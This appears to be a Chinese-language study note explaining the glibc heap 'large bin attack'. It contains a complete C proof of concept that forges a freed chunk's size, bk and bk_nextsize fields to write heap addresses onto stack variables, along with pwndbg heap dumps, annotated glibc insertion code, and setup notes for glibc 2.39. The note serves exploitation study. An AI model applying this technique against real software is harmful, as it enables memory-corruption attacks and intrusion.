该技术可用于修改任意地址的值为一个堆地址，例如栈上的变量 stack_var1 和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在 fastbin attack 中用于修改全局变量 global_max_fast 为一个很大的值。

```c
修改large bin的bk与bk_nextsize，最后导致bk与bk_nextsize被写入下一个进入large bin的chunk的堆地址
pwndbg> x/20gx 0x6036f0  -->p2
0x6036f0:       0x0000000000000000      0x00000000000003f1-->为了绕过极值判断，p3 的大小 (0x410) 大于 p2 伪造的大小 (0x3f0，忽略标志位)，所以 (size) < (bck->bk->size) 为假，程序进入核心的 else 分支
0x603700:       0x0000000000000000      0x00007fffffffda90（stack）
0x603710:       0x0000000000000000      0x00007fffffffda88
0x603720:       0x0000000000000000      0x0000000000000000
```



**原理：**

```c
// 1. 跳表指针插入操作（fd_nextsize, bk_nextsize）
victim->fd_nextsize = fwd;
victim->bk_nextsize = fwd->bk_nextsize;
fwd->bk_nextsize = victim;
victim->bk_nextsize->fd_nextsize = victim;  // <--- 攻击点 1

// 2. 双向链表指针插入操作（fd, bk）
bck = fwd->bk;
// ...
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;                           // <--- 攻击点 2
```





```c
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>
 
int main()
{
    fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
    fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x420);
    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the first large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p2 = malloc(0x500);
    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the second large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p3 = malloc(0x500);
    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
 
    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
           " the third large chunk during the free()\n\n");
    malloc(0x20);
 
    free(p1);
    free(p2);
    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));

    malloc(0x90);
    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));

    free(p3);
    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
 

    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    //------------------------------------

    malloc(0x90);
 
    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
            " During this time, targets should have already been rewritten:\n");

    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    // sanity check
    assert(stack_var1 != 0);
    assert(stack_var2 != 0);

    return 0;
}

```

首先申请三个大的chunk（size>0x400），中间申请小的chunk防止free时合并

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x603290
Size: 0x430 (with flag bits: 0x431)

Allocated chunk | PREV_INUSE
Addr: 0x6036c0
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x6036f0
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x603c00
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x603c30
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x604140
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x604170
Size: 0x1fe90 (with flag bits: 0x1fe91)
    
    
    
//释放之后两个chunk先进入unsorted bin
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x290 (with flag bits: 0x291)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x603290
Size: 0x430 (with flag bits: 0x431)
fd: 0x7ffff7e1ace0
bk: 0x6036f0

Allocated chunk
Addr: 0x6036c0
Size: 0x30 (with flag bits: 0x30)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x6036f0
Size: 0x510 (with flag bits: 0x511)
fd: 0x603290
bk: 0x7ffff7e1ace0

Allocated chunk
Addr: 0x603c00
Size: 0x30 (with flag bits: 0x30)

Allocated chunk | PREV_INUSE
Addr: 0x603c30
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x604140
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x604170
Size: 0x1fe90 (with flag bits: 0x1fe91)

    
//malloc(0x90)后，堆管理器会将第一个chunk切割，并且整理剩下的chunk进入相应的bin中：
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x603290
Size: 0xa0 (with flag bits: 0xa1)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x603330
Size: 0x390 (with flag bits: 0x391)
fd: 0x7ffff7e1ace0
bk: 0x7ffff7e1ace0

Allocated chunk
Addr: 0x6036c0
Size: 0x30 (with flag bits: 0x30)

Free chunk (largebins) | PREV_INUSE//-->largebins
Addr: 0x6036f0
Size: 0x510 (with flag bits: 0x511)
fd: 0x7ffff7e1b110
bk: 0x7ffff7e1b110
fd_nextsize: 0x6036f0
bk_nextsize: 0x6036f0

Allocated chunk
Addr: 0x603c00
Size: 0x30 (with flag bits: 0x30)

Allocated chunk | PREV_INUSE
Addr: 0x603c30
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x604140
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x604170
Size: 0x1fe90 (with flag bits: 0x1fe91)    
    
    
    
//free(p3),并且伪造p2

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x603290
Size: 0xa0 (with flag bits: 0xa1)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x603330
Size: 0x390 (with flag bits: 0x391)
fd: 0x7ffff7e1ace0
bk: 0x603c30

Allocated chunk
Addr: 0x6036c0
Size: 0x30 (with flag bits: 0x30)

Allocated chunk | PREV_INUSE
Addr: 0x6036f0
Size: 0x3f0 (with flag bits: 0x3f1)

Allocated chunk
Addr: 0x603ae0
Size: 0x00 (with flag bits: 0x00)
    
pwndbg> x/20gx 0x6036f0  -->p2
0x6036f0:       0x0000000000000000      0x00000000000003f1
0x603700:       0x0000000000000000      0x00007fffffffda90（stack）
0x603710:       0x0000000000000000      0x00007fffffffda88
0x603720:       0x0000000000000000      0x0000000000000000
```

需要注意的是 large bins 中 chunk 按 fd 指针的顺序从大到小排列，如果大小相同则按照最近使用顺序排列：

```c
// 1. 跳表指针插入操作（fd_nextsize, bk_nextsize）
victim->fd_nextsize = fwd;
victim->bk_nextsize = fwd->bk_nextsize;
fwd->bk_nextsize = victim;
victim->bk_nextsize->fd_nextsize = victim;  // <--- 攻击点 1

// 2. 双向链表指针插入操作（fd, bk）
bck = fwd->bk;
// ...
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;                           // <--- 攻击点 2
```

假设我们有一个漏洞，可以对 large bin 里的 chunk p2 进行修改，结合上面的整理过程，我们伪造 p2 如下：

```c
pwndbg> x/20gx 0x6036f0  -->p2
0x6036f0:       0x0000000000000000      0x00000000000003f1-->为了绕过极值判断，p3 的大小 (0x410) 大于 p2 伪造的大小 (0x3f0，忽略标志位)，所以 (size) < (bck->bk->size) 为假，程序进入核心的 else 分支
0x603700:       0x0000000000000000      0x00007fffffffda90（stack）
0x603710:       0x0000000000000000      0x00007fffffffda88
0x603720:       0x0000000000000000      0x0000000000000000
```

**第一次任意地址写 (利用跳表)**：

- 代码执行：`victim->fd_nextsize = fwd;	fwd->bk_nextsize = victim;` （`victim->bk_nextsize` 变成了 `&stack_var2 - 0x20`）。
- 代码执行：`victim->bk_nextsize->fd_nextsize = victim;`
- **底层等价于**：`(&stack_var2 - 0x20) + 0x20 = victim`
- **结果**：目标变量 `stack_var2` 成功被写入了 `p3` (即 `victim`) 的堆块地址！

**准备物理链表写入**：

- 代码执行：`bck = fwd->bk;` （此时 `bck` 被赋值为 `p2->bk`，也就是 `&stack_var1 - 0x10`）。

**第二次任意地址写 (利用物理链表)**：

- 代码跳出极值判断的 `if/else` 后，执行底部的链表更新：`bck->fd = victim;`
- **底层等价于**：`(&stack_var1 - 0x10) + 0x10 = victim`
- **结果**：目标变量 `stack_var1` 也成功被写入了 `p3` 的堆块地址！



#### 2.39

在2.39中，我们仅仅需要修改bk_nextsize为target - 0x20，即可。但同时要注意的是我们在add之前应该布置如下：

```c
large bin :
Free chunk (largebins) | PREV_INUSE
Addr: 0x56fec9ad4910
Size: 0x790 (with flag bits: 0x791)
fd: 0x73bbbfe20cc0
bk: 0x73bbbfe20cc0
fd_nextsize: 0x56fec9ad4910
bk_nextsize: 0x73bbbfe21640
    
同时，我们需要有unsorted bin 中的一个chunk 该chunk的size<large bin的chunk，但同时要求他们的大小在同一个large bin的范围内
    
    
Free chunk (largebins) | Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x56fec9ad3290
Size: 0x780 (with flag bits: 0x781)
fd: 0x73bbbfe20cc0
bk: 0x73bbbfe20cc0
fd_nextsize: 0x00
bk_nextsize: 0x00
   

最后再malloc一个大chunk使unsorted bin chunk进入largebin中触发large bin attack
```













